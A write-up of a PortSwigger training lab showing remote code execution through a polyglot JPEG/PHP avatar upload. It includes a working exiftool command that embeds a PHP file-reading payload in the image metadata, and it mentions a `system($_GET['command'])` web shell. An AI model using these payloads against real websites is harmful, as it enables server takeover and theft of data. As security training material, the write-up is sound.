# Lab 06 — Remote code execution via polyglot web shell upload

**Difficulty:** 🟡 Practitioner  
**Technique:** File Upload — polyglot PHP/JPG via ExifTool metadata injection  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

---

## Concept

The server validates the uploaded file's actual content (magic bytes), not just the extension or Content-Type header. A polyglot file bypasses this by being simultaneously a valid JPEG (passes the magic bytes check) and a valid PHP script (executed by the interpreter). The trick is injecting the PHP payload into the image's metadata — specifically the `Comment` field via ExifTool. When the server serves the file and PHP parses it, it executes the embedded code regardless of the binary JPEG data surrounding it.

---

## Process

### Step 1 — Obtain a real JPEG

Download a legitimate JPEG from the internet or save the existing avatar from the lab's account page (right click → Save image as). The source image **must be a real JPEG** — a PNG or other format renamed to `.jpg` will have incorrect magic bytes and fail the server's content validation silently with a 500.

### Step 2 — Create the polyglot with ExifTool

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

This writes the PHP payload into the JPEG's `Comment` metadata field and saves the result as `polyglot.php`. The file retains valid JPEG magic bytes (`FF D8 FF`) while containing executable PHP.

Verify the payload is present:

```bash
strings polyglot.php | grep "START\|php\|file_get"
# Expected output:
# <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

### Step 3 — Upload via browser with Intercept OFF

Upload `polyglot.php` as the account avatar directly from the browser. No need to intercept — Burp logs everything in the proxy history regardless.

### Step 4 — Trigger execution by navigating to the account page

Go back to the account page in the browser. The page loads the avatar automatically, which causes the browser to issue a `GET /files/avatars/polyglot.php` request — this is what triggers PHP execution server-side.

### Step 5 — Find the secret in Burp's proxy history

In Burp → Proxy → HTTP history, locate the `GET /files/avatars/polyglot.php` request. Open the response and use the search feature (Ctrl+F in the message editor) to find `START`. The secret appears between the `START` and `END` markers, embedded within the binary image data:

```
START <secret> END
```

---

## Issues encountered

- **500 on every attempt with a renamed PNG:** the base image was a PNG renamed to `.jpg` without converting it. The server validates actual magic bytes, not the filename extension — a PNG starts with `\x89PNG`, not `FF D8 FF` (JPEG), so the content validation failed silently and returned 500. Fix: use a real JPEG.
- **`system($_GET['command'])` doesn't work for this lab:** this payload requires an explicit HTTP request with the `command` parameter. The polyglot avatar is served as a static file by the browser — there's no mechanism to pass GET parameters in that context. The correct approach is `file_get_contents()` embedded directly in the payload, which executes at parse time without any parameters.

---

## Takeaways

- Magic bytes validation is stronger than extension or Content-Type checks, but doesn't prevent polyglot attacks
- ExifTool's `Comment` field survives the JPEG structure intact and is reachable by the PHP interpreter
- The base image must be a genuine JPEG — renaming a PNG is not enough, magic bytes must match
- `file_get_contents()` is the right payload here: executes at parse time, no parameters needed
- The secret is embedded in binary output — use Burp's search to find it, don't try to read it raw
- Intercept doesn't need to be ON to capture traffic — proxy history logs everything passively

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
- [ExifTool documentation](https://exiftool.org/)
- [File Upload Cheat Sheet — HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
